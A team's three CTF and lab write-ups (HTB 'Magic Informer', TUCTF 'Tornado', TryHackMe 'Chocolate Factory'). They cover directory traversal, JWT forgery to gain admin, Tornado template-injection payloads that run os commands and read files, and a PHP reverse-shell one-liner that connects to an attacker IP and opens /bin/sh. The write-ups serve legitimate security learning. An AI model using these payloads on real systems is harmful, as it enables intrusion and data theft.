# Team: Schokomilk disco
**Areeb Hussain, Vasiliy Klyosov**

## HTB University CTF 2022 : Supernatural Hacks
**Challenge:** The magic Informer                                                                                                                                        
**Challenge Description:** The Magic Informer is the only byte-sized wizarding newspaper that brings the best magical news to you at your fingertips! Due to popular demand and bold headlines, we are often targeted by wizards and hackers alike. We need you to pentest our news portal and see if you can gain access to our server.      
**Challenge category:** Web                                                                                                                                              
**Challenge diffuculty:** easy

## <div align="center">Write up 1</div>


I started by opening the webserver on my browser from the given ip address and port
`http://134.209.30.169:30713/register`
Started to look around and clicking on the images , but there was one interesting button ‘We are hiring’, which leads to a register page. `http://134.209.30.169:30713/register`
![](https://i.imgur.com/W6uKSyQ.png)


As shown in the picture above there were some input fields that saves user data and a upload option that only lets you upload only docx files.


Looking at the upload I assumed it could be a file upload vulnerability(LFI) so I uploaded  a simple php file taken from Mr Münch notes, turns out it was uploaded?
![](https://i.imgur.com/UuepqDm.png)

But when I changed the request to GET in order to force the webserver to run the file, it didn’t execute
![](https://i.imgur.com/xdS3TPC.png)

Moving on. All this data and the file upload needs to be stored somewhere. So I did a dirb on this webserver and got some additional folders in it
![](https://i.imgur.com/O8vEQ0f.png)

The `/download` folder seemed interesting…

Just the ip/download directory didn’t lead anywhere so I tried some Directory traversal
![](https://i.imgur.com/vuqkJNl.png)

So theres `app/uploads` folder lets dig deeper into these folders

There was nothing in the /upload folder, I guess all those files that I uploaded never did get uploded?

After some try and error , I figured out the directories where  all the Javascript source code was kept

Its folders is at the path `http://134.209.30.169:30713/download?resume=..././` and all the source code  files are  here

Deliberately adding a “.” in the path gives a list of other folders with source code files (index.js)
![](https://i.imgur.com/Rbm84ED.png)

Reviewing the app/routes/index.js file there was a mention of `admin.db` So I downloaded it from the path `http://134.209.30.169:30713/download?resume=..././admin.db`

Its a sql lite data base which could be open with sqllitebrowser, the file looks something like this
![](https://i.imgur.com/31wYsEq.png)

Also it confirms under the **enrollments** table that the php files were never uploaded, only our test.docx that was uploaded
![](https://i.imgur.com/PVuKTlo.png)


Looking at the **users** table theres also an `admin` user beside my `schokomilk`
![](https://i.imgur.com/mbTLzJ5.png)

The admin password looks somewhat of a encryption maybe. After checking it with different types of decoder, I conclude it is not an encryption. Will come to it later.
 
After some guidance on JSON Web Tokens by Mr Münch. I logged in with my user schokomilk and copied the generated cookie session via burp suite intercepter. This copied cookied is to pasted in on **jwt.io**    
![](https://i.imgur.com/kbAXQfa.png)


Here we change the payload; `username: admin` and paste the newly generated token back your intercepted cookie session.

Voila! Admin is logged in
![](https://i.imgur.com/DhhbD2k.png)

On the admin dashboard only two buttons are functional `SMS Gateway` and `SQL Prompt`. Lets look into these.

**Note:** Every time we click a somewhere on the page, we  need to intercept and change the cookie session with the admin jwt otherwise it will load your user dashboard again using the previous session 

![](https://i.imgur.com/fnvt9pp.png)

In the above picuture the query cannot be executed because this endpoint is whitelisted to local host only. We need to look at the files again here and see where it validates the “localhost"

after going through all of the different index.js files, I saw an import LocalMiddleware.js, the word Local got my attention here, so I downloaded the file through directory traversal path
`134.209.30.169:30713/download?resume=..././../middleware/LocalMiddleware.js`

Here we can see it validates the ip address from where the request is received and the Host header request.
![](https://i.imgur.com/G5dV3yh.png)

So now we know the local Host, lets look at the `SMS Gate` way page.
![](https://i.imgur.com/KAK5E0t.png)

After playing around and sending some **‘Test SMS’** it is clear that their needs to be some manipulation in the HTTP Parameters.
![](https://i.imgur.com/IUGaTj3.png)

For the APIKEY ,  I thought it could be the admin password from the users table in the DB that so I tried putting  apiKEY: `“45f56005f5907945c2351e2b0e64cce6”` but did not work, but now its clear that we need a correct key.

![](https://i.imgur.com/frQmKfg.png)

Unfortunately I coudln't find the flag and this is what I could do till the end.

**Extra:**
On Clicking a ‘map’ picture on the main webserver page, it opened an Employee Archive page,
but for some reason after refreshing the docker container this page was not accessible by clicking the ‘map’ picture again.
![](https://i.imgur.com/HlYzTgg.png)

<br/>
<br/>
<br/>


# TUCTF

## <div align="center">Write up 2</div>
**Challenge:** Tornado                                                                                                                                                  
**Challenge Description:** My friend gave me the templet to his website, it is built using tornado. Can you help me find the flag?                                      
**Challenge category:** web                                                                                                                                              
**Challenge diffuculty:** easy

Main page of tornado
![](https://i.imgur.com/wFPySYe.png)
It returns a normal greeting when we enter our name but if we inspect the source of the page there is also hidden information about Joe and the amount of cookies he has

![](https://i.imgur.com/a39hMcQ.png)

Also cookies is in boolean value but when we change it to yes nothing happens :(

![](https://i.imgur.com/kyibzpz.png)
Also we can notice that tornado runs on a python server and fun fact, we can inject some python code on it
![](https://i.imgur.com/S0ZMz9r.png)
 we can try something like this:
 ![](https://i.imgur.com/73p34T8.png)
![](https://i.imgur.com/yUVrEnD.png)
After doing some research on secure-cookie.io and experimenting with the input, I got another interesting info while writing payload for ls command: {% import os %}{{os.popen('ls').read()}}
![](https://i.imgur.com/nM4prBD.png)

It turns out /app/web2.py is the path for the script, so I tried to open it with the next script: {{open("/app/web2.py").read()}}

![](https://i.imgur.com/mPchn1i.png)

I pointed out the important information, there is a riddle with cookies that we can solve, or you could have just executed a payload to give the output, which I did, we got the flag, which is ==TUCTF{t0rnad0_1snt_v3ry_s3cur3}==

<br/>
<br/>
<br/>


# TryHackMe

## <div align="center">ADDITIONAL Write up 3</div>

**Challenge:** Chocolate Factory by AndyInfosec                                                                                                                          
**Challenge Description:** A Charlie And The Chocolate Factory themed room, revisit Willy Wonka's chocolate factory!                                                    
**Challenge category:** privillege escalation                                                                                                                            
**Challenge diffuculty:** easy                                                                                                                                          
*It is an optional writeup, since the writeups for this challenge were already available at the moment when we started solving it, but we still solved it by ourselves and decided to include the writeup(for fun)*

I started by nmaping to see which ports are open
![](https://i.imgur.com/RbHNFTv.png)

My next step was dir and gobusters to find any potential hidden links that may be useful. I did gobuster dir -x ".txt,.php,.html" -u 10.10.177.63 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt	
And I found /home.php which has code execution vulnerability
![](https://i.imgur.com/CHuZZO6.png)

the next step was obvious, te set up a listener, I went straight to pentestmonkey for a script:
php -r '$sock=fsockopen("10.9.5.25",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

Reverse shell is done 
![](https://i.imgur.com/8E6ijRy.png)

There was a directory with a hidden key that I saved but didn't find the right usage for
![](https://i.imgur.com/Ra6nfSO.png)
With this file we found a user name and a key it used for something

%slaksdhfas - login or laksdhfas if we strings the file instead of cat
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=' - key

there was a php file which gives credentials of a user, the access to whom would lead me to home.php which I already know thanks to gobuster
![](https://i.imgur.com/WU7BnsY.png)

if we go back we can identify the user which has been hacked, her name is charlie
![](https://i.imgur.com/H3te2Ua.png)
There are3 files, 2 of them are private and public key, respectively, but the other one is hidden from us, that's why we are performing a genius move.
I copied the key in a file on my local machine, changed mode to 777 and used it to establish an ssh connection with the user charlie on the given IP address with that key, the command looked like this: ssh -i id_rsa charlie@ip_addr

we got into the same directory and were able to cat the flag
![](https://i.imgur.com/SXwCNCV.png)
but, it wasn't the flag we needed to complete the CTF :(

let's see if charlie can be root 
![](https://i.imgur.com/dFtJ9dt.png)

now the hardest part begins, privilege escalation:
![](https://i.imgur.com/WsYppVd.png)

Unfortunately, I was not able to gain root and get the root flag but still had fun :)
